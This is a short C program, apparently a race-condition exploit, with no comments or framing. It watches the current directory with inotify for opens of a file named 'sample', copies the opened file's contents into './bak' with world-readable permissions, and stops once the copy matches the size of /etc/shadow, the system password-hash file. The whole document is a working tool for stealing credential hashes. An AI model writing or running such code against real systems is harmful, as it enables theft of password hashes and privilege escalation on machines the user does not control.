#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/stat.h>

#define TARGET_FILENAME ("sample")
#define TARGET_DIRNAME ("./")
#define ORIGIN_FILENAME ("/etc/shadow")
#define DESTINATION ("./bak")
#define ev_size (sizeof(struct inotify_event) + PATH_MAX + 1)
#define buf_size (4096)

size_t copy(const char *path) {
	
	int tfd, dfd;
	size_t rb;
	char *line;

	if( (tfd = open(path, O_NONBLOCK|O_RDONLY)) == -1 ) return 0;
	if( (dfd = open(DESTINATION, O_CREAT|O_WRONLY, 0666)) == -1 ) return 0;
	
	line = malloc(buf_size);
	memset(line, 0, buf_size);
	rb = 0;
	
	while( read(tfd, line, buf_size) ) {
		rb += write(dfd, line, strlen(line));
		memset(line, 0, buf_size);
	}

	free(line);
	close(tfd);
	close(dfd);
	return rb;
}

int main(void) {

	int fd,wd;
	size_t rb;
	struct inotify_event *event = malloc(ev_size);
	struct stat st;

	if( (fd = inotify_init()) == -1 ) {
		perror("inofity_init()");
		return 1;
	}
	
	if( (wd = inotify_add_watch(fd, TARGET_DIRNAME, IN_OPEN)) == -1 )	{ /* we don't really intrested in other events */
		perror("inotify_add_watch()");
		return 1;
	}

	while( read(fd, event, ev_size) ) {
		if( !strncmp(event->name, TARGET_FILENAME, sizeof(TARGET_FILENAME)) ) {
			rb = copy(event->name);
			stat(ORIGIN_FILENAME, &st);
			if( st.st_size == (off_t) rb ) break;
		}
	}

	free(event);
	return 0;
}
